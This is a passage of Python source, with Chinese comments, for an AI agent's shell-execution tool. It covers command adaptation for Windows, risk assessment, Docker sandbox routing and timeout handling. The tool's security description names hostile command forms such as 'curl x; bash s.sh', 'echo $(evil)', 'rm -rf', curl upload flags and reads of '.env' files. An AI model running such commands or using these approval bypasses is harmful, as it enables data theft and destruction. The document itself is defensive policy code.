    adapted = re.sub(r"\btouch\s+", "type nul > ", adapted)

    # ls <args> → dir <args>（简单替换，不处理复杂参数）
    adapted = re.sub(r"\bls\s+-la\b", "dir /a", adapted)
    adapted = re.sub(r"\bls\s+-l\b", "dir", adapted)
    adapted = re.sub(r"\bls\s+-a\b", "dir /a", adapted)
    adapted = re.sub(r"\bls\b", "dir", adapted)

    # cat <file> → type <file>
    adapted = re.sub(r"\bcat\s+", "type ", adapted)

    # grep <pattern> <file> → findstr <pattern> <file>（简单替换）
    adapted = re.sub(r"\bgrep\s+-r\s+", "findstr /s ", adapted)
    adapted = re.sub(r"\bgrep\s+-i\s+", "findstr /i ", adapted)
    adapted = re.sub(r"\bgrep\s+", "findstr ", adapted)

    # which <cmd> → where <cmd>
    adapted = re.sub(r"\bwhich\s+", "where ", adapted)

    # clear → cls
    adapted = re.sub(r"\bclear\b", "cls", adapted)

    return adapted


def _sandbox_result_to_standard(sandbox_result, command: str) -> StandardToolResult:
    """将 SandboxResult 转换为 StandardToolResult（保持输出格式一致）。

    Phase D：沙箱执行结果与本机执行结果统一格式，上层工具无感知差异。
    """
    output_parts = []
    if sandbox_result.stdout.strip():
        output_parts.append(sandbox_result.stdout.strip())
    if sandbox_result.stderr.strip():
        output_parts.append(f"[stderr]\n{sandbox_result.stderr.strip()}")

    output = "\n\n".join(output_parts) if output_parts else "(命令执行完成，无输出)"
    # fail-closed 错误：优先展示明确错误（含原因与建议），不再出现"降级"标签
    if sandbox_result.error:
        return StandardToolResult(
            content=f"沙箱执行失败: {sandbox_result.error}\n命令: {command}",
            status=ToolStatus.ERROR,
            source="shell_exec",
            metadata={
                "return_code": sandbox_result.return_code,
                "command": command,
                "sandboxed": sandbox_result.sandboxed,
                "sandbox_error": sandbox_result.error,
            },
        )
    sandbox_tag = " [沙箱执行]" if sandbox_result.sandboxed else ""

    if sandbox_result.timed_out:
        return StandardToolResult(
            content=f"命令执行超时{sandbox_tag}。命令: {command}\n已捕获输出:\n{output}",
            status=ToolStatus.ERROR,
            source="shell_exec",
            metadata={
                "timeout": True,
                "command": command,
                "sandboxed": sandbox_result.sandboxed,
            },
        )

    if sandbox_result.return_code != 0:
        return StandardToolResult(
            content=f"命令退出码: {sandbox_result.return_code}{sandbox_tag}\n{output}",
            status=ToolStatus.ERROR,
            source="shell_exec",
            metadata={
                "return_code": sandbox_result.return_code,
                "command": command,
                "sandboxed": sandbox_result.sandboxed,
            },
        )

    return StandardToolResult(
        content=output,
        status=ToolStatus.SUCCESS,
        source="shell_exec",
        metadata={
            "return_code": sandbox_result.return_code,
            "command": command,
            "sandboxed": sandbox_result.sandboxed,
        },
    )


def assess_command_risk_level(command: str, working_dir: str = "") -> RiskLevel:
    """评估命令风险等级（审批与沙箱路由同源，S-01/S-02）

    公开 API（CT-09 转正）：agent_hub 侧 ShellExecApprovalPolicy.assess_risk
    跨 app 消费本函数（agent_hub→tools 为合法依赖方向），保证沙箱路由与审批
    展示的风险等级一致；原 _ 下划线私有名使模块边界形同虚设。
    注意：不含子 agent 风险加权（工具层无 subagent 上下文），
    子 agent 中被上调为 HIGH 的命令由高危子串模式兜底强制沙箱。

    F3：判定前先做平台适配——本函数是审批中间件（middleware.assess_risk）与
    执行层（_execute_command）的共同判定入口，适配前置保证"审批/路由评估的
    命令 = 实际执行的命令"（Windows 上 rm -r → rmdir /s /q 等改写后再判定，
    而非执行前才改写）。适配为幂等纯函数，重复调用无副作用。

    R3 1.4：working_dir 透传给白名单参数级校验——相对路径参数按实际执行
    目录 resolve 后校验允许目录（`cat .env` 类命令不得免审批）。

    Args:
        command: 待判定命令串
        working_dir: 工具调用 working_dir 参数（ShellExecApprovalPolicy 从
            args 透传，_execute_command 从调用参数透传）
    """
    command = _adapt_command_for_platform(command)
    if _is_command_blocked(command):
        return RiskLevel.SAFE  # 黑名单：工具层直接拒绝，无需审批/沙箱
    if _is_command_whitelisted(command, working_dir):
        return RiskLevel.SAFE
    # B3 单源：HIGH 判定与沙箱路由共用 common/sandbox 权威词表
    # （含原 5 宽泛关键字 + 解释器/计划任务等扩展模式）
    from Django_xm.common.sandbox.executor import is_high_risk_command

    if is_high_risk_command(command):
        return RiskLevel.HIGH
    return RiskLevel.CONTROLLED


def _reap_after_kill(process: subprocess.Popen, is_windows: bool) -> None:
    """超时强杀后的兜底回收（R3 1.10）：等待退出，Unix 对忽略 SIGTERM 的
    进程升级 SIGKILL。

    二次 communicate(timeout=5) 失败意味着子进程树仍存活（Unix 下 SIGTERM
    可能被忽略）；不 wait 会遗留僵尸进程。处置：wait(5) → 超时则 SIGKILL
    （Unix 进程组）或 process.kill() → 再次 wait(5)；仍不退出的极端进程
    error 留痕（不可强杀属内核级异常，上层已有超时错误返回兜底）。
    """
    try:
        process.wait(timeout=5)
        return
    except subprocess.TimeoutExpired:
        pass
    except Exception:  # noqa: S110  # wait 异常（进程对象已失效等）继续走强杀
        pass
    try:
        if not is_windows and hasattr(os, "killpg"):
            try:
                os.killpg(os.getpgid(process.pid), signal.SIGKILL)  # type: ignore[attr-defined]  # POSIX-only
            except (ProcessLookupError, PermissionError, OSError):
                try:
                    process.kill()
                except (OSError, ProcessLookupError):
                    pass
        else:
            try:
                process.kill()
            except (OSError, ProcessLookupError):
                pass
    except Exception:  # noqa: S110  # 清理路径，不应影响调用方
        pass
    try:
        process.wait(timeout=5)
    except Exception:
        logger.error(f"shell_exec: 进程强杀后仍未退出（疑似不可回收），pid={process.pid}")


def _execute_command(
    command: str,
    timeout: int = DEFAULT_TIMEOUT,
    working_dir: str = "",
    *,
    enable_sandbox: bool = False,
    thread_id: str = "",
) -> StandardToolResult:
    """执行 Shell 命令并返回结果

    Phase D 集成：HIGH 级命令通过沙箱执行器路由（任务级开关 enable_sandbox 判定）。
    - sandbox_executor.should_sandbox(command, enable_sandbox=...) → True
      → 长驻 Docker 容器内执行（docker exec 复用，自愈重建，fail-closed）
    - 否则 → 本机直接执行（原有逻辑，行为不变）

    使用 Popen + communicate(timeout) 替代 subprocess.run，
    超时后通过 _kill_process_tree 终止整个进程树，
    解决 Windows shell=True 下子进程不被杀导致管道挂起的问题。

    F3：平台适配已前移至本函数入口（审批/风险判定/沙箱路由之前），
    执行、路由与审批评估同源（审批内容=实际执行内容）。
    """
    # 平台适配：修正 Windows 不兼容的命令参数（如 mkdir -p），判定与执行同源
    command = _adapt_command_for_platform(command)

    # 风险等级：复用审批策略判定（与 ApprovalMiddleware 同源），
    # 作为沙箱路由阶梯依据（HIGH 强制沙箱 / controlled 进容器 / safe 本机）
    # R3 1.4：working_dir 同源透传（相对路径白名单校验基准 = 实际执行目录）
    risk_level = assess_command_risk_level(command, working_dir)

    # Phase D: 沙箱路由（risk_level 阶梯 + 任务级开关，fail-closed）
    try:
        from Django_xm.common.sandbox import sandbox_executor

        if sandbox_executor.should_sandbox(
            command, risk_level=risk_level, enable_sandbox=enable_sandbox
        ):
            effective_timeout = min(_get_effective_timeout(command, timeout), MAX_TIMEOUT)
            safe_cwd = _get_safe_working_dir(working_dir)
            sandbox_result = sandbox_executor.execute(
                command,
                working_dir=safe_cwd,
                timeout=effective_timeout,
                risk_level=risk_level,
                # 路由已判定必须进沙箱（HIGH 强制 / controlled 已开任务开关），
                # 此处固定 True：防止 execute 的任务级开关守卫把 HIGH 命令落回本机
                enable_sandbox=True,
                thread_id=thread_id,
            )
            # 沙箱执行指标已在 SandboxExecutor.execute() 出口统一记录（单一数据源），
            # 此处不再重复记录，避免 fail-closed 路径被重复计数。
            # fail-closed：沙箱执行失败（容器二次失败/不可用）时返回明确错误，
            # 绝不静默降级本机执行
            return _sandbox_result_to_standard(sandbox_result, command)
    except ImportError:
        pass  # 沙箱模块不可用，走本机执行
    except Exception as sandbox_err:
        # fail-closed：沙箱路由异常不静默降级本机，返回明确错误（含建议）
        logger.exception("shell_exec: 沙箱路由异常（fail-closed）")
        return StandardToolResult(
            content=f"沙箱执行路由异常: {sandbox_err}。请检查 Docker 服务，或关闭沙箱后重试。",
            status=ToolStatus.ERROR,
            source="shell_exec",
            metadata={"command": command, "sandbox_error": str(sandbox_err)},
        )

    effective_timeout = _get_effective_timeout(command, timeout)
    effective_timeout = min(effective_timeout, MAX_TIMEOUT)
    cwd = _get_safe_working_dir(working_dir)
    is_windows = platform.system() == "Windows"
    timed_out = False

    try:
        popen_kwargs = {
            "stdout": subprocess.PIPE,
            "stderr": subprocess.PIPE,
            "cwd": cwd,
            "encoding": "utf-8",
            "errors": "replace",
        }
        if is_windows:
            # 命令执行工具设计使然（agent shell 工具）：命令经白名单/禁止模式校验，隔离由沙箱与权限保障
            process = subprocess.Popen(command, shell=True, **popen_kwargs)  # noqa: S602
        else:
            process = subprocess.Popen(  # noqa: S603
                ["bash", "-c", command],  # noqa: S607
                start_new_session=True,  # 创建新进程组，便于 killpg
                **popen_kwargs,
            )

        try:
            stdout, stderr = process.communicate(timeout=effective_timeout)
        except subprocess.TimeoutExpired:
            timed_out = True
            logger.warning(f"shell_exec: 命令超时（{effective_timeout}s），终止进程树: {command[:100]}")
            _kill_process_tree(process, is_windows)
            # 终止后再尝试读取已缓冲的输出
            try:
                stdout, stderr = process.communicate(timeout=5)
            except (subprocess.TimeoutExpired, Exception):
                stdout, stderr = "", ""
                # R3 1.10：二次读取失败 = 子进程树仍存活（Unix 下 SIGTERM 可能
                # 被忽略），补 wait + SIGKILL 兜底，防止僵尸进程
                _reap_after_kill(process, is_windows)

        stdout = stdout or ""
        stderr = stderr or ""

        # 截断输出
        if len(stdout) > MAX_OUTPUT_LENGTH:
            stdout = stdout[:MAX_OUTPUT_LENGTH] + f"\n... [输出已截断，共 {len(stdout)} 字符]"
        if len(stderr) > MAX_OUTPUT_LENGTH // 4:
            stderr = stderr[: MAX_OUTPUT_LENGTH // 4] + "\n... [错误输出已截断]"

        output_parts = []
        if stdout.strip():
            output_parts.append(stdout.strip())
        if stderr.strip():
            output_parts.append(f"[stderr]\n{stderr.strip()}")

        output = "\n\n".join(output_parts) if output_parts else "(命令执行完成，无输出)"

        if timed_out:
            return StandardToolResult(
                content=f"命令执行超时（{effective_timeout}秒），已终止。命令: {command}\n已捕获输出:\n{output}",
                status=ToolStatus.ERROR,
                source="shell_exec",
                metadata={"timeout": effective_timeout, "command": command, "timed_out": True},
            )

        if process.returncode != 0:
            return StandardToolResult(
                content=f"命令退出码: {process.returncode}\n{output}",
                status=ToolStatus.ERROR,
                source="shell_exec",
                metadata={"return_code": process.returncode, "command": command},
            )

        return StandardToolResult(
            content=output,
            status=ToolStatus.SUCCESS,
            source="shell_exec",
            metadata={"return_code": process.returncode, "command": command},
        )

    except FileNotFoundError as e:
        return StandardToolResult(
            content=f"命令未找到: {e}",
            status=ToolStatus.ERROR,
            source="shell_exec",
            metadata={"command": command},
        )
    except Exception as e:
        return StandardToolResult(
            content=f"命令执行异常: {type(e).__name__}: {e}",
            status=ToolStatus.ERROR,
            source="shell_exec",
            metadata={"command": command},
        )


# ── 工具定义 ──────────────────────────────────────────────────────


class ShellExecInput(BaseModel):
    """Shell 命令执行工具输入"""

    command: str = Field(description="要执行的 Shell 命令")
    timeout: int = Field(default=DEFAULT_TIMEOUT, description=f"命令执行超时时间（秒），最大 {MAX_TIMEOUT} 秒")
    working_dir: str = Field(default="", description="命令执行的工作目录，为空则使用当前目录")


class ShellExecTool(AsyncToolMixin, BaseTool):
    """Shell 命令执行工具

    安全策略：
    1. 禁止命令：始终拒绝执行（由 _is_command_blocked 检查）
    2. 审批：由 ApprovalMiddleware 在 after_model 钩子统一处理
       （非白名单命令触发审批，白名单/黑名单命令不拦截）
    3. 超时控制：防止命令挂起
    4. 输出截断：防止返回内容过大

    工具层不参与审批判断，到达 _run 的命令已通过审批（或无需审批）。
    """

    name: str = "shell_exec"
    version: str = TOOL_VERSION
    metadata: dict = Field(
        default_factory=lambda: {"tier": "extended", "visibility": "selectable", "category": "system"}
    )
    description: str = (
        "执行 Shell 命令并返回输出结果。"
        "适用场景：需要运行命令行工具（如 pandoc 只读转换、python manage.py 安全子命令等）、查看系统信息、执行自动化任务。"
        "不适用：文件读写（应使用 fs_read_file/fs_write_file）、网络搜索（应使用 web_search）。"
        "参数：command-要执行的命令（必填），timeout-超时秒数（默认60），working_dir-工作目录（默认当前目录）。"
        "安全策略：白名单命令（pandoc stdout 只读转换、git status、python manage.py help/check/showmigrations/test/migrate --check 等安全子命令）直接执行；"
        "cat/type/ls/dir/head/tail/wc/find 等文件读取命令仅放行允许目录内的路径参数（SHELL_EXEC_ALLOWED_DIRS/DATA_DIR），"
        ".env/密钥等敏感文件一律需审批；"
        "curl 仅放行 GET 类只读用法（-X 只允许 GET，URL 协议仅 http/https，"
        "禁 -d/-T/--data/--upload/-F/--form 等外传形态与 -O/-J/-K/--config 写出配置形态，输出目标限允许目录内）；"
        "pandoc 仅放行 stdout 输出用法（-o/--output 写文件与 --lua-filter/--filter 过滤器需审批）；"
        "agent-browser、python -m pytest/unittest（等价任意代码执行）已移出白名单，需走审批流程；"
        "manage.py 的 shell/dbshell/shell_plus 子命令被禁止（等价任意代码执行）；"
        "manage.py 其他子命令（migrate/runserver/collectstatic 等）与非白名单命令（含 python/node/npx 等可执行任意代码的解释器）需走审批流程；"
        "携带拼接/替换/重定向/管道符号（; && || | > < $( ` 换行）的命令强制走审批"
        "（防止 curl x; bash s.sh、echo $(evil) 等绕过）；"
        "危险命令（rm -rf、shutdown 等）始终拒绝。"
    )
    args_schema: type[BaseModel] = ShellExecInput

    def _run(
        self,
        command: str,
        timeout: int = DEFAULT_TIMEOUT,
        working_dir: str = "",
        config: RunnableConfig | None = None,
    ) -> str:
        """执行 Shell 命令

        审批由 ApprovalMiddleware 在 after_model 钩子统一处理，
        工具层不参与审批判断。到达此方法的命令已通过审批或无需审批。

        config：工具调用运行时配置（langchain-core 自动注入）。
        从 config.configurable 读取任务级开关 enable_sandbox 与 thread_id，
        用于沙箱路由判定与长驻容器定位（与 execute_research_async 注入同源）。
        """
        # 参数校验：防止 LLM 传入空参数导致不可预期的行为
        if not command or not command.strip():
            logger.warning("shell_exec: 收到空命令，拒绝执行")
            return StandardToolResult(
                content="命令不能为空，请提供要执行的 Shell 命令。",
                status=ToolStatus.ERROR,
                source="shell_exec",
                metadata={"command": command, "empty_command": True},
            ).to_tool_message()

        logger.info(f"shell_exec: 收到命令请求: {command[:200]}")

        # F3：平台适配前移到工具层拦截/审批/执行之前——后续黑名单检查、
        # 元数据记录与实际执行均针对平台适配后的命令（审批内容=实际执行内容）
        command = _adapt_command_for_platform(command)

        # 检查禁止命令（黑名单命令始终拒绝，不由审批处理）
        blocked_reason = _is_command_blocked(command)
        if blocked_reason:
            logger.warning(f"shell_exec: 命令被禁止: {command[:100]} ({blocked_reason})")
            return StandardToolResult(
                content=f"命令已被安全策略拦截: {blocked_reason}\n命令: {command}\n此命令属于危险操作，不允许执行。",
                status=ToolStatus.ERROR,
                source="shell_exec",
                metadata={"command": command, "blocked": True, "reason": blocked_reason},
            ).to_tool_message()

        # 执行命令（审批已由 ApprovalMiddleware 统一处理）
        logger.info(f"shell_exec: 执行命令: {command[:100]}")
        # 任务级沙箱开关与 thread_id 从工具调用上下文（config.configurable）读取：
        # 与 execute_research_async 注入 configurable 同源，默认关闭（本机执行，行为不变）
        configurable = ((config or {}).get("configurable") or {}) if config else {}
        enable_sandbox = bool(configurable.get("enable_sandbox", False))
        thread_id = str(configurable.get("thread_id", "") or "")
        result = _execute_command(
            command,
            timeout,
            working_dir,
            enable_sandbox=enable_sandbox,
            thread_id=thread_id,
        )
        return result.to_tool_message()


# ── 工厂函数 ──────────────────────────────────────────────────────


def get_shell_exec_tools() -> list:
    """获取 Shell 执行工具列表"""
    return [ShellExecTool()]


# 单例实例
shell_exec = ShellExecTool()
